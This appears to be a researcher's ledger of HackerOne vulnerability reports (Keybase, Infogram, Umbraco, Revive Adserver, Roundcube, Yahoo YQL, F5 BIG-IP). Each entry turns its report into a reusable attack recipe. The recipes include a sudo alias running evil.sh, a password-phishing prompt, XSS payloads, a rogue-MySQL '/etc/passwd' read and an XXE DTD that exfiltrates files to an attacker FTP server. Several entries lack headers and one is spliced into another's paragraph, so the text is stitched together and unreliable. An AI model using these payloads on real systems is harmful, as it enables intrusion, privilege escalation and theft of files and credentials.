SOURCE: https://hackerone.com/reports/485407  2026-11-11
ROUTE: live `.json` -> HTTP 404; `web_extract` of the live page -> HackerOne sign-in wall ("You need to sign in or sign up before continuing"); browser tool on the live URL -> Cloudflare "Just a moment" bot wall; `r.jina.ai` -> 401 bad-IP-reputation; Wayback (single capture 20221004160703) -> JS shell ("Content Not Loaded / Enable Cookies"), CDX intermittently "Internet Archive: Temporarily Offline". ROUTE THAT WORKED: the HuggingFace dataset mirror `elamaran619/hackerone_disclosed_reports` (parquet `data/train-00000-of-00001.parquet`, 14,908,392 B, queried locally with duckdb) -> full 11,679-char `vulnerability_information` body (`visibility: full`). Metadata: Keybase, "From nobody to somebody", weakness Privilege Escalation (id 75), reporter `u3mur4`, created 2019-01-24, disclosed 2020-01-24, resolved, bounty yes, 47 votes.
STATUS: UNVERIFIED (not reproduced — no macOS host this pass; every command and code line below is quoted from the report).
CLASS: privilege escalation (local, macOS) — a privileged installer Helper writes SYMLINKS into the shared PATH dir `/usr/local/bin` pointing into an ATTACKER-WRITABLE directory chosen via `--app-path`, where the "must live under /Applications" guards are beaten by a literal `PREFIX/../..` traversal string; the attacker then swaps the symlinks for wrapper scripts and hijacks code execution as any user (including admins) who runs the tool.
CORE METHOD (the reporter's own steps, quoted):
  1. THE PRIMITIVE, verbatim: as low-priv user (`nobody`) — "Create the `/var/tmp/poc/Contents/SharedSupport/bin` folder structure with 2 symlinks which are pointing to the original `keybase` and `git-remote-keybase` binaries" (`ln -s /Applications/Keybase.app/Contents/SharedSupport/bin/keybase keybase`, same for `git-remote-keybase`); "The `nobody` user has write permission to `/var/tmp` directory and content of the directory is preserved between reboots."
  2. THE TRIGGER, verbatim: `/Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path=/Applications/Keybase.app/../../var/tmp/poc --install-cli` — the privileged Helper logs `Helper: addToPath({ directory = "/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin"; name = keybase; })` -> `Result: { path = "/usr/local/bin/keybase"; }` and REPLACES `/usr/local/bin/{keybase,git-remote-keybase}` with symlinks into the attacker dir ("Notice that the `nobody` account has no permission the change these links directly" — the privileged helper did it FOR them).
  3. THE GATES THAT FAILED (reporter's root-cause analysis, verbatim code): (a) `KBCommandLine.m` `if (![self.config isInApplications:self.servicePath])` — a STRING prefix check satisfied by the traversal literal ("That is why we specify the `/Application...` appPath with the `../..` components in step 3"); (b) `KBHelper.m` `checkAbsolutePath:hasAbsolutePrefix:` — "check that the path path has the prefix prefix, being wise to whatever attacks people will throw at us, like /a/b/../../.." — compares `stringByStandardizingPath` output; per the reporter's demonstration it returns YES and "the add `addToPath` function will create the link"; (c) `linkedToServicePath` accepts because the attacker's initial symlinks resolve to `servicePath`.
  4. THE PAYLOAD, verbatim: "Remove our links in the `/var/tmp/poc/Contents/SharedSupport/bin/` folder and create some executable files" — wrappers `#!/bin/bash` / `id >> /tmp/out` / exec the real binary with `"$@"`; "Wait until the `u3mur4` account using the `git clone keybase://` or the `keybase` command" -> `/tmp/out` shows `uid=501(u3mur4)`; "From now on we can access any file and run arbitrary command as the targeted account. Also we can access the `private` keybase folder of the user and other sensitive data."
  5. TO ROOT, verbatim (section 7): `.bash_profile` `alias sudo='sudo sh -c '\''evil.sh & exec "$@"'\'' sh'`; AppleScript "keybase helper need to update..." password phish; "sudoers policy caches credentials for 5 minutes"; "Homebrew changes the permissions on `/usr/local/bin` ... place a program called sudo in /usr/local/bin".
DETECTION SIGNAL: a privileged helper/installer/updater CLI that accepts an app/bundle PATH argument from an unprivileged caller and (re)writes symlinks or binaries into a shared PATH directory (`/usr/local/bin`, `/usr/libexec`); a "path must be under /Applications"-style guard implemented as a literal STRING prefix or a normalize-then-compare demonstrated passing for `PREFIX/../../<attacker>`; installer logs showing `addToPath` / `Link resolved to path:` with a traversal path.
CHAIN: unprivileged local user (primitive: any shell account, `nobody` suffices) -> run the app's own privileged installer CLI with `--app-path=<allowed-prefix>/../../<attacker-dir>` (primitive: string-prefix guards accept the traversal literal) -> the privileged Helper plants symlinks in `/usr/local/bin` pointing at attacker-writable `/var/tmp/poc/Contents/SharedSupport/bin` (escalation: privileged write into a shared PATH dir) -> swap symlink -> wrapper script (the target dir stays attacker-writable; the link is never re-validated) -> any user incl. admins executes attacker code on the next `keybase` / `git clone keybase://` (escalation: code as admin + their Keybase private folder and files) -> root via sudo-alias / AppleScript password phish / sudoers 5-minute credential cache / Homebrew-writable `/usr/local/bin` `sudo` shim (impact: full local system compromise; bounty awarded).
TRANSFERABLE TEST: on any installer/updater/helper that takes a path argument: (1) pass `<allowed-prefix>/../../<your-writable-dir>` as the source/app path and watch for privileged file/symlink writes into shared PATH dirs (logs: `addToPath`, `Link resolved`); (2) pre-create the expected bundle skeleton (`Contents/SharedSupport/bin`) in your writable dir with symlinks to the legit binaries to satisfy link-resolution checks; (3) after the privileged write, swap the symlinks for wrapper scripts and verify code execution as a higher-privilege user who runs the tool; (4) for guards, diff the LITERAL vs RESOLVED forms of your path — `isInApplications`-style STRING prefixes are beaten by `PREFIX/../..`, normalize-then-compare guards must be tested with both forms. Rule: **a privileged helper that (re)links shared PATH entries at a user-supplied app path hands every later invoker of that command to whoever can write the link target — the traversal is just the delivery, the planted link into a writable dir is the bug.**
DEDUPE/DELTA: 0 hits across all three write targets for `485407`, `addToPath`, `app-path`, `git-remote-keybase`, `nobody to somebody`, `SharedSupport` (`u3mur4`'s only recorded hit is the GitLab "run pipeline jobs as arbitrary user" report, unrelated). Related-but-distinct recorded material REVIEWED and NOT re-recorded: the Keybase installer family entry (~ledger 5844-5865: #471739 duplicate `--source-path` option -> privileged COPY of an attacker bundle into /Applications with caller ownership carried over; KB004 helper TOCTOU move RPC + redirector placement; `mirchr` keybase-redirector trusted-$PATH ~ledger 3630) — those are privileged COPY / TOCTOU / $PATH-order bugs; #485407 is privileged SYMLINK-PLANTING into `/usr/local/bin` via `addToPath` plus the post-install swap, a distinct mechanism; the sandbox path-normalization entry (~ledger 5556: "value whose canonical form lands inside the allowed prefix while its literal form resolves to your file" + "attacker-settable flag that short-circuits the trust check") is the OPPOSITE normalization direction and about sandbox allowlists — a related chain link only. NEW: `--app-path` traversal -> privileged `addToPath` symlink planting -> symlink swap -> victim-invocation hijack -> §17.484.

SOURCE: https://hackerone.com/reports/719875  2026-11-11
ROUTE: full reporter body (1,665 B `vulnerability_information`, `visibility: full`) read live this pass on the `.json` route (`curl` -> HTTP 200). Metadata: Infogram, "LFI through the MySQL connection", weakness Information Disclosure, severity High (User), reporter `muon4`, created 2019-10-22, disclosed 2019-11-12, Closed/Resolved.
STATUS: UNVERIFIED (not reproduced — no Infogram account and no rogue MySQL server stood up this pass; every step, query and command below is quoted from the report).
CLASS: internal file read (LFI) via ROGUE MYSQL SERVER + `LOAD DATA LOCAL INFILE` — a "connect your own database" feature lets the user choose the DB HOST and the STATEMENT; the app server's MySQL client has `local_infile` enabled, so the attacker's server answers the handshake with a file-read request and the app server SENDS its local files.
CORE METHOD (the reporter's own steps, quoted):
  1. ENTRY POINT, verbatim: "Login" -> "Make a new infographic or navigate to the existing one" -> "Now add new MySQL connection under `data` section".
  2. THE STATEMENT, verbatim: set the SQL SELECT statement to `LOAD DATA LOCAL INFILE '/etc/passwd'` / `INTO TABLE asd.asd` / `FIELDS TERMINATED BY "\n"` — the "SELECT" field accepts a LOAD DATA statement (statement type not enforced).
  3. THE ROGUE SERVER, verbatim: "Fill other necessary information (IP address, port etc..)" pointing at "the 'evil' MySQL server with the database/table called `asd` and other needed information. Point your MySQL connection from infogram app to this server"; capture with `tcpdump -s 0 port 3306 -i eth0 -w infogramsteal.pcap`.
  4. TRIGGER + PROOF, verbatim: "Now click `Create` in the infogram app" -> in the pcap: the LOGIN REQUEST "where you can see that `LOAD DATA LOCAL` is set to the value `1` which is basicly same than `true`", and the **Request Command Unknown** frame "which basicly contains the value of the file `/etc/passwd`" — "`/etc/passwd` and `/etc/hosts` files" both read from the server. FIX, verbatim: "Disable the `LOAD DATA LOCAL` feature if possible."
DETECTION SIGNAL: any feature that connects to a USER-SUPPLIED database host/port (BI/dashboard "connect your database", data import, analytics sync); the MySQL client handshake advertising the `local_infile` capability (`LOAD DATA LOCAL` = 1 in the login packet); a query/statement field that accepts non-SELECT statements. Tell: your rogue server receives the connection FROM THE APP SERVER and can answer it with a file-read request.
CHAIN: any authenticated user of the DB-connection feature (primitive: user-supplied host/port + statement) -> the app server's MySQL client connects to the attacker's rogue server with `local_infile=1` (primitive: client-side LOCAL INFILE enabled) -> the statement names the file (`LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd`) and the rogue server answers the query with the LOCAL-infile request (escalation: the CLIENT pushes the file) -> arbitrary server-side file read (`/etc/passwd`, `/etc/hosts` demonstrated) -> config/credential files (`.env`, app config, `/proc/self/environ`) -> credentials/API keys -> wider compromise of the host and its data (impact: full server file read; team High).
TRANSFERABLE TEST: on ANY "connect your own database / data source" feature: (1) stand up a rogue MySQL server (e.g. `fnmsd/MySQL_Fake_Server`, `4ra1n/mysql-fake-server`, rogue_server.py) on 3306; (2) point the feature at it and submit `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY '\n'` in whatever "query"/"SELECT" field exists; (3) `tcpdump -s 0 port 3306 -w x.pcap` and look for the login packet with `LOAD DATA LOCAL = 1` plus a file-transfer frame ("Request Command Unknown") carrying the file bytes; (4) escalate the path to `.env`, app config, `/proc/self/environ`. Rule: **no SQLi is needed — if the app will open a MySQL connection to YOUR server with a statement YOU wrote, its own client hands you its local files whenever `local_infile` is on.**
DEDUPE/DELTA: 0 hits across all three write targets for `719875`, `muon4`, `LOAD DATA`, `INFILE`, `rogue MySQL`, `evil MySQL`, `fake MySQL`, `attacker-controlled database` (the only `local_infile` hits are the sqli-testing OOB-exfil note where `local_infile`/`secure_file_priv` BLOCK exfil — the inverse observation — and vulhub lab READMEs under /root/scan/flags, not the write targets). Related-but-distinct REVIEWED and NOT re-recorded: the SSRF -> rogue-service material (gopher/Redis/`dict://`) and OOB SQLi exfil channels — those pull data OUT of a DB via the server's egress; this entry makes the app's DB CLIENT push local FILES to the attacker, the opposite direction. NEW -> §17.485.

SOURCE: https://hackerone.com/reports/634679  2026-11-11
ROUTE: full reporter body (2,558 B `vulnerability_information`, `visibility: full`) read live this pass on the `.json` route (`curl` -> HTTP 200) — includes the failing regression specs and the ACL source. Metadata: HackerOne (self-reported), "Custom Field Attributes may be created and updated for customers with Custom Field Trial enabled", weakness Improper Access Control - Generic, severity Medium 5.2 (User-rated; C:L I:L A:N), reporter `jobert`, created 2019-07-03, disclosed 2019-07-05, Closed/Resolved.
STATUS: UNVERIFIED (not reproduced — no HackerOne tenant with the trial feature was available this pass; every code block and word below is quoted from the report).
CLASS: privilege escalation / BAC via ACL EVALUATION ORDER — a feature-trial grant short-circuits the permission check because the `return_true_if { feature_enabled?(TRIAL) }` clause sits BEFORE the role check in the policy function.
CORE METHOD (the reporter's own steps, quoted):
  1. THE GATING, verbatim: "The Custom Field feature is currently only available for customers on the Enterprise product edition. A trial period can be given by enabling the `custom-fields-trial` feature for programs who are not on that product edition (yet)."
  2. THE ACL, verbatim source: `def can_manage_custom_fields?` -> `return_true_if { feature_enabled?(::Feature::CUSTOM_FIELDS_TRIAL, team: team) }` -> `return_false_if { team.gates.closed?(FeatureGating::Gates::CUSTOM_FIELDS) }` -> `can_view_custom_fields_settings?` which is `return_true_if { program_management_permission? }`.
  3. THE BUG, verbatim: "when enabling this feature, the incorrect ordering of an ACL causes a vulnerability that allows anyone that can access the program to create and update Custom Field Attributes. This also works for private programs with an External Program Profile." Root cause, verbatim: "The first `return_true_if` block is called before the `program_management_permission?` block. Test coverage for this particular block was lacking in the integration specs for the ACL, as well as the classes using the ACL."
  4. THE PROOF SHAPE, verbatim: two regression specs (`describe '#can_manage_custom_fields?' ... it { is_expected.to eq false }`) — a user added as an invited hacker (`Commands::WhitelistedReporters::Create ... source: WhitelistedReporter::SOURCE_UNKNOWN_INVITE`) and a private program with a published external program must BOTH get `false` while the trial feature is enabled.
DETECTION SIGNAL: a policy/ACL function whose FIRST clause is a feature-flag/plan/trial short-circuit (`return_true_if { feature_enabled?(...) }` / `if (featureEnabled(...)) return true;`) evaluated before any role/permission clause; black-box tell: a trial/feature enablement for the tenant is followed by previously-denied actions SUCCEEDING for non-manager users (invited/external users included).
CHAIN: the program/tenant enables a trial feature (routine sales/program-manager action — the attacker does nothing) -> the ACL's feature clause returns TRUE before the role check for EVERY user with program access, including invited hackers on private programs with an External Program Profile (primitive: ACL order bug = role bypass) -> low-privilege users create and update Custom Field Attributes (escalation: write access to restricted configuration objects) -> "may disclose confidential attributes and its configuration set by program members or impact the integrity of an existing Custom Field Attribute" (impact: BAC — cross-role read/write on config; team Medium 5.2, C:L/I:L; the report notes "only three programs have this feature enabled").
TRANSFERABLE TEST: on any app with feature trials / plan editions: (1) as the LOWEST-privilege user with program/tenant access, record the 403s on trial-covered actions; (2) enable (or request) the trial feature; (3) replay the same requests — 200s mean the feature check short-circuits the ACL ahead of the role check; (4) where policy code or introspection is reachable, verify clause ORDER — any `return_true_if { feature_enabled?(X) }` preceding role checks IS the bug; (5) also test invited/external/lowest roles, not just self-registered users. Rule: **a feature flag is a GRANT, not a ROLE — when its check sits before the permission check in the same policy function, enabling the trial promotes every user at once.**

CLASS: pre-authentication STORED XSS in a customer-contact/ticket intake API, escalating to customer-service back-office ATO and CMS RCE (CWE-79 -> CWE-94 chain).
CORE METHOD (the reporter's own steps, quoted):
  1. ENTRY POINTS, verbatim: `POST /Umbraco/Api/ContactApi/SavePersonalContactExtended/`, `POST /Umbraco/Api/ContactApi/SaveProductContactExtended/`, `POST /Umbraco/Api/ContactApi/SaveAttachment` — "Reachable on all in-scope locale paths" (`/at`, `/bg`, `/cz`, `/de`, ... and root), zero cookies required.
  2. THE STACKED CONTROL FAILURES (the report's table, verbatim): reCAPTCHA v2 — "Server accepts empty `ReCaptcha=` parameter; validation is client-side only"; CSRF — "None present; endpoint accepts requests with zero cookies"; Origin/Referer — "None; `Access-Control-Allow-Origin: *` permits cross-origin attacks"; sanitization — "None; `<script>`, `<img onerror>`, `<svg onload>`, `javascript:` URIs accepted in all text fields"; email validation — "Broken; `\"<script>alert(1)</script>\"@a.com` accepted"; rate limit — "None; 8 tickets submitted in 2 seconds, all successful"; `SiteId` authorization — "Not enforced; any tenant ID accepted, enabling cross-brand attacks"; attachment authorization — "Not enforced".
  3. STAGE THE ATTACHMENT (verbatim PoC): a PDF with `/OpenAction << /JS (app.alert(1)) >>` uploaded to `SaveAttachment` -> response `["3ef49a63-e18f-40d2-94d6-5289c80f9efd_jsx.pdf"]`, referenced via `AttachmentFilename[0]`; "File validation checks magic bytes for images but accepts PDF/DOCX/ZIP by extension only".
  4. STORE THE PAYLOAD: the ticket POST carries payloads in 12+ fields — `FirstName=<img src=x onerror="alert(document.domain)">`, `LastName=<svg/onload=alert(document.domain)>`, `Message=<script>alert("XSS in Message field")</script>`, `Address=<a href="javascript:alert(1)">`, `PageUrl=javascript:alert('pageurl')`, etc. — with `ReCaptcha=` empty -> `{"success":true,...}`.
  5. THE SINK, verbatim: "When a customer-service operator logs into the Umbraco back-office and opens the ticket for review, the JavaScript in any of the 12 injected fields executes in their authenticated session" — "reviewing inbound customer messages is the operator's primary job function, guaranteeing payload execution."
  6. CROSS-TENANT PIVOT, verbatim: "The `SiteId` parameter accepts any valid tenant ID without authorization checks"; tenant enumeration IDOR `GET /umbraco/Surface/CountryPickerSurface/CountryModal?siteId=1901` -> sibling brands; "An attacker targeting only ████ can inject XSS into the customer-service back-office of any sibling brand by changing the `SiteId` parameter."
DETECTION SIGNAL: a pre-auth contact/ticket/upload API that returns `{"success":true}` for a POST with an EMPTY captcha parameter and zero cookies; `Access-Control-Allow-Origin: *` on a state-changing endpoint; a staff-review back-office (Umbraco/Zendesk/Salesforce-style) rendering the submitted fields; a `SiteId`/tenant/brand parameter honored without ownership check; honeypot fields documented in public JS (`contact_me_by_fax_only`).
CHAIN: unauthenticated attacker (preconditions: none — captcha server-side check absent, no CSRF/Origin gate) -> stored XSS in 12+ ticket fields (primitive: unsanitized intake) -> operator opens the ticket (guaranteed by job function) -> script runs in the operator's back-office session -> exfiltrate cookies/XSRF tokens, create administrator accounts via `/umbraco/management/api/v1/...`, install an Umbraco package containing server-side code => RCE on the CMS host serving 14+ brand sites (impact: back-office ATO -> RCE -> cross-tenant brand compromise; team Critical 9.0, S:C).
TRANSFERABLE TEST: on any contact/ticket/intake API — (1) POST directly with `ReCaptcha=` (or `captcha`/`g-recaptcha-response`) empty and no cookies: `{"success":true}` means the gate is client-side decoration; (2) inject `<img src=x onerror=...>` / `<svg/onload=...>` / `javascript:` URIs into EVERY text field including the quoted-local-part email trick `"<script>alert(1)</script>"@a.com`; (3) enumerate and rotate tenant/brand IDs (`SiteId`-style params + IDOR endpoints like CountryPicker); (4) verify the sink by having the ticket rendered in the staff UI (callback fires in the operator session); (5) chain the operator session to admin-create/package-upload endpoints for the ATO->RCE escalation. Rule: **a contact form is a pre-auth write into a guaranteed-view staff queue — if the server accepts an empty captcha token, every downstream field is an unauthenticated stored-XSS vector into the back-office.**

Metadata: Revive Adserver, "PHP code injection in delivery-limitation `logical` validation bypass - XML-RPC setChannelTargeting", weakness Code Injection, severity high, reporter `doomtech`, created 2026-06-04, disclosed 2026-06-25, Closed; affected 0–6.0.7, fixed 6.0.8; CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 8.8.
STATUS: UNVERIFIED (not reproduced — no Revive Adserver instance stood up; the report body is redacted, so every statement below is quoted from the public CVE records / vendor changelog, not from the report body).
CLASS: RCE / CWE-94 code injection — a "delivery limitation" RULE BUILDER compiles user-controlled rule fields into PHP that is STORED (`compiledlimitations` DB column) and evaluated on every banner delivery; the patch validation is bypassed through a PARALLEL entry point (XML-RPC) the fix did not cover.
CORE METHOD (quoted from the public records):
  1. THE SINK: "When an administrator or operator saves these limitations, the application persists a compiled representation of the logical expression in the `compiledlimitations` database column. This compiled string is later evaluated as PHP code during the banner delivery flow" (SentinelOne CVE-2026-34916 analysis).
  2. THE ORIGINAL INJECTION (CVE-2026-34916, verbatim advisory text): "A missing validation of user input when saving delivery limitations in Revive Adserver 6.0.6 and earlier could allow a low-privileged user to use the `logical` parameter to inject malicious PHP code into the `compiledlimitations` field on the database and have it executed during banner delivery." The `logical` parameter "was not validated against an allowlist of expected logical operators" — arbitrary PHP syntax is concatenated into the stored compiled expression. Sibling variant CVE-2026-44959, verbatim: "A low-privileged user could add an unexpected component parameter and inject malicious PHP code into the `compiledlimitations` field".
  3. THE FIX-BYPASS (CVE-2026-50741 = THIS REPORT, verbatim): "Bypass to the fix for CVE-2026-34916... The fix can be bypassed either by sending a disallowed but otherwise valid plugin identifier as `type`, or using the `ox.setChannelTargeting` XML-RPC API method." The 6.0.7 fix added validation on one path; the XML-RPC method and the structurally-valid-but-denylisted `type` identifier reach the same unsafe compilation. "Versions up to 6.0.7 are affected; update to 6.0.8" (6.0.8 "strengthens validation of plugin identifiers and XML-RPC inputs").
  4. TRIGGER + IMPACT: "After saving, any subsequent banner delivery request triggers execution of the attacker-controlled PHP" — "arbitrary code execution under the web server account", full host compromise (CVSS 8.8, C:H I:H A:H).
DETECTION SIGNAL: any feature that COMPILES user-authored rules/expressions into stored executable code ("rule builder", "workflow conditions", "delivery limitations", "segment logic") behind a `compiled*`/eval-style column or cache; a second, older API surface (XML-RPC/legacy SOAP/GraphQL) performing the same write; a CVE/fix landing on one parameter or one entry point only.
CHAIN: low-privileged authenticated user (precondition: an account with delivery-limitation edit permission) -> crafted `logical` value (or disallowed-but-valid plugin identifier as `type`, or `ox.setChannelTargeting` via XML-RPC) -> PHP stored in `compiledlimitations` -> evaluated on every banner delivery -> RCE as the web-server user -> full ad-server/host takeover (impact: RCE; both CVEs 8.8).
TRANSFERABLE TEST: on any rules/conditions-to-code feature — (1) save a benign rule and find the compiled artifact (DB column / cache / generated file) to see what your input became; (2) inject PHP/JS/template syntax through EVERY rule field (`logical` operators, `type` identifiers, component parameters) and trigger the evaluation path; (3) when a fix lands on the UI path, replay through EVERY parallel API (XML-RPC `ox.setChannelTargeting`-style, GraphQL, legacy endpoints) and through structurally-valid-but-denylisted enum values; (4) retest the SIBLING PARAMETERS (`component` was CVE-2026-44959) and the SIBLING ENTRY POINTS (`type` + XML-RPC were CVE-2026-50741) — a fix naming one parameter is a map of what to retest. Rule: **user rules compiled into stored code are an eval surface — and a patch on one door is a TODO list for the others: retest every sibling parameter and every parallel API that reaches the same compiler.**
DEDUPE/DELTA: 0 hits across all three write targets for `3781492`, `compiledlimitations`, `setChannelTargeting`, `delivery limitation`, `doomtech`, `logical` parameter as an injection carrier. Related-but-distinct REVIEWED and NOT re-recorded: the recorded Revive material — #3401612/§17.339 (IDOR banner deletion), #3470970 (executionorder RXSS), CVE-2025-55129 (username blacklist homoglyphs) — different classes entirely; §17.480 (code generation from recorded values into an EXPORTED file, one-shot) — here the generated code is STORED and re-evaluated on every request; the SSTI/template entries — template engines, not a rule-to-PHP compiler. NEW: rules-compiled-to-stored-PHP eval surface + fix bypass via unpatched parallel entry point and sibling parameter -> §17.488.

SOURCE: https://hackerone.com/reports/3443563  2026-11-11
ROUTE: full reporter body (1,041 B `vulnerability_information`, `visibility: full`) read live this pass on the `.json` route (`curl` -> HTTP 200). Metadata: Nextcloud (Roundcube Webmail), "Roundcube Webmail Style Sanitizer can be bypassed using CSS Character Escapes", weakness Information Disclosure, severity medium, reporter `somerandomdev`, created 2025-11-27, disclosed 2026-01-14, Closed.
STATUS: UNVERIFIED (not reproduced — no Roundcube instance stood up this pass; the payload is quoted from the report).
CLASS: STYLE-SANITIZER BYPASS via CSS CHARACTER ESCAPES -> arbitrary inline CSS in HTML e-mail -> out-of-band request (IP/UA disclosure).
CORE METHOD (the reporter's own steps, quoted):
  1. THE PAYLOAD, verbatim (HTML e-mail, opened in Roundcube HTML mode): `<div style='content: "\0026quot;; background: url(//http.cat/418); content:""; width: 100%; height: 100%;'>hi, this shouldn't work :(</div>`.
  2. THE BREAKOUT, verbatim: "`\0026` is a CSS entity and will be decoded to `&`. Together with the `quot;` afterwards, this will close the string token and cause the rest of the string token to be interpreted as CSS." — the sanitizer accepts the `content: "..."` value AS A STRING and never re-tokenizes after escape-decoding, so `\0026quot;` materializes `&quot;` which TERMINATES the string token; everything after it (`background: url(...)`) is live CSS the sanitizer never inspected as code.
  3. THE EFFECT, verbatim: "The background image will be applied to the element, causing a HTTP request to https://http.cat/418" -> impact: "retrieve the IP address and user agent of the person reading the email" ("This allows using arbitrary inline CSS, like e.g. `url()`").
DETECTION SIGNAL: a style/CSS sanitizer that allowlists declarations by tokenizing values where STRING CONTENT is escape-decoded AFTER token boundaries are fixed; payloads whose escape decodes to a quote/terminator (`\0026` -> `&`, `\0022` -> `"`, `\0027` -> `'`, `\003c` -> `<`) surviving into rendered CSS; tell: `content:"..."`-style string values in `style` attributes accepted with backslash escapes intact.
CHAIN: attacker sends one HTML e-mail (no auth, no user role) -> the style sanitizer accepts the escape-laden `content` string (primitive: tokenize-before-decode) -> `\0026quot;` decodes and closes the string token -> the rest of the string executes as CSS declarations (`background: url()`) -> the mail client fetches the attacker's URL when the mail is opened -> the collector logs the victim's IP + User-Agent (documented impact: consent-free e-mail tracking + IP/UA disclosure; the report's stated capability is "arbitrary inline CSS").
TRANSFERABLE TEST: on any CSS/style sanitizer (mail clients, CMS, rich-text editors) — (1) submit `content: "\0026quot;; background: url(https://<you>/x); content:""` and the `\0022`/`\0027`/`\003c` variants inside a `style` attribute or `<style>` block; (2) open the rendered content and watch your collector — any hit means the sanitizer tokenized before decoding; (3) once the string boundary is yours, the full CSS language after the breakout is available (`url()` exfil; attribute-selector DOM exfil is the standing escalation of arbitrary CSS); (4) also test escape-encoded terminators against every string-typed CSS context (`content`, `font-family`, `quotes`). Rule: **a CSS sanitizer that fixes string boundaries before decoding character escapes can be told where the string ends — `\0026` plus a quote word breaks the token, and everything after it is code the sanitizer already approved.**
DEDUPE/DELTA: 0 hits across all three write targets for `3443563`, `somerandomdev`, `\0026`, `content:` string-token breakout, `style sanitizer`. Related-but-distinct REVIEWED and NOT re-recorded: §17.450 (#3486747, same product family — the sanitizer's remote-image blocklist misses `<feImage href>`; a URL-CARRIER coverage gap, different gate and different mechanism); the AMP4Email entry (~ledger 11438 — CSS escapes like `\00003c` smuggling a `</style>` PAST a validator across TWO parsers; here ONE sanitizer mis-tokenizes a string and the sink is CSS declarations, not HTML). NEW: CSS character-escape string-token breakout in a style sanitizer -> §17.489.

SOURCE: https://hackerone.com/reports/19693  2026-11-11
ROUTE: reporter body is REDACTED SERVER-SIDE (`visibility: no-content`, `vulnerability_information` 0 B — verified on the HuggingFace `elamaran619/hackerone_disclosed_reports` train parquet via duckdb), so no capture can hold it. Routes tried this pass IN ORDER: live `.json` (HTTP 404), `web_extract` of the live page (HackerOne sign-in wall), browser tool on the live URL (Cloudflare "Just a moment" bot wall — never cleared), `r.jina.ai` (401 bad-IP-reputation), Wayback — the 20240524003845 raw `id_` capture is a JS shell BUT its `<meta name="og:description">` carries the report's own summary (quoted verbatim below), HF mirror row (created 2014-07-10, reporter `agarri_fr`, team yahoo/Yahoo!, 14 votes, no bounty, weakness Information Disclosure) with a 0 B body, two web searches for a credited public writeup (none found — only generic XXE guides). Every fact below is quoted from the report's own og:description and title; the exact payload bytes were NOT recoverable and nothing was invented.
STATUS: UNVERIFIED (not reproduced)
CLASS: XXE (blind, out-of-band) / internal file read — a server-side XML-IMPORT feature (YQL `feednormalizer` table, `prexslurl` parameter) FETCHES and parses an attacker-supplied XML document with external-entity resolution enabled; the attacker never uploads a file — the XML arrives by URL (CWE-611).
CORE METHOD (sourced steps, verbatim quotes):
  1. THE ENTRY POINT, verbatim: "The Yahoo Query Language (YQL) service allowed arbitrary XML documents to be loaded via the `feednormalizer` table and its `prexslurl` parameter."
  2. THE PAYLOAD MECHANISM, verbatim: "This enabled an attacker to exfiltrate data from the YQL backend servers by defining external parameter entities in the XML document that read local files."
  3. THE EXFIL, verbatim: "The contents of these files were then sent out-of-band to an attacker-controlled FTP server." (report title, verbatim: "Out-of-band read of arbitrary ASCII files on YQL backend servers via XML external parameter entities")
DETECTION SIGNAL: any feature that fetches a REMOTE document and parses it as XML/XSLT/feed — "import from URL", RSS/Atom feed fetchers, sitemap fetchers, `prexslurl`/XSLT-transform URL params, HTML sanitizers or converters that parse fetched markup; the tell is that the attacker supplies only a URL and the server does the XML parsing — external parameter entities plus an FTP/DNS listener complete the read even when nothing is reflected.
CHAIN: attacker supplies a URL to their own XML in a fetch-and-parse feature (primitive: no upload needed — the XML arrives by URL) -> the import path resolves external parameter entities in the fetched DTD (primitive: DTD/entity resolution enabled server-side) -> a parameter entity reads `file://` content and the nested exfil entity places it into an FTP URI (exfil mechanism recorded at §17.204) -> the backend connects out to the attacker FTP and the file contents arrive in the connection path (impact: arbitrary ASCII file read on the backend server — internal file read, P2 data impact).
TRANSFERABLE TEST: on any URL-import/XML-parse feature — (1) point the URL parameter at a host you control and serve XML with `<!DOCTYPE x [<!ENTITY % remote SYSTEM "http://<you>/x.dtd"> %remote;]><x/>`; (2) serve the standard two-stage DTD (`<!ENTITY % file SYSTEM "file:///etc/passwd">` and `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://<you>:2121/%file;'>">` then `%eval;%exfil;`); (3) listen on FTP (FTP carries multi-line file content, HTTP query strings do not) and read the file off the connection path. Rule: **a feature that fetches a URL and XML-parses the result is an XXE sink without any upload — supply your own XML by URL and complete the blind read through parameter entities + FTP exfil.**

Related-but-distinct REVIEWED and NOT re-recorded: every recorded XXE entry has the attacker SUBMIT or UPLOAD the XML — §17.204 (OOXML upload; HTTP-fetched DTD + nested parameter entity -> FTP exfil — the exfil leg of THIS entry is cited, not re-claimed), the SVG-upload XML-entity entry (~ledger 8907), the autodiscover POST entry (~ledger 10507), the WebDocXML form-field blind XXE (~ledger 11684); here the XML itself is FETCHED from an attacker URL by the server. Metadata: 8x8, "F5 BIG-IP TMUI RCE - CVE-2020-5902 (██.packet8.net)", reporter `remonsec`, created 2022-03-23, disclosed 2022-03-25, weakness Code Injection, CVE-2020-5902, no bounty; the vendor summary, verbatim: "@remonsec reported to us a vulnerability in F5 BIG-IP's Traffic Management User Interface (TMUI), which exploited, could have led to RCE (in undisclosed pages): CVE-2020-5902. We swiftly applied the fix to the F5 BIG-IP & restricted access further, which resolved the issue."
STATUS: UNVERIFIED (not reproduced — no F5 appliance was touched; every request shape below is quoted from the public PoCs/advisory, not from the redacted report body).
CLASS: RCE — a front-end/back-end PATH-NORMALIZATION MISMATCH (`..;` semicolon path-parameter) reaches the UNDISCLOSED, unauthenticated vendor admin JSP endpoints on an edge appliance (F5 BIG-IP TMUI / Configuration utility), whose `command=` parameter executes tmsh = arbitrary system commands (CVE-2020-5902, CVSSv3 10.0).
CORE METHOD (sourced steps):
  1. SURFACE: the BIG-IP Traffic Management User Interface (TMUI/Configuration utility) — reachable on the management port and/or self IPs (default TCP 443; 8443 on single-NIC VE 13.0.0+). The vulnerable pages are "undisclosed" (F5's own word) — never linked in the UI. In the report they sat on an obscure subdomain (██.packet8.net).
  2. THE BYPASS — root cause, Praetorian verbatim: "this was an issue where the Apache httpd service interpreted the '/..;/' characters in a URL differently than the Apache Tomcat service on the backend." `..;` is a path parameter: the front end normalizes PAST it, the back end STRIPS it and resolves the hidden JSP with no authentication check.
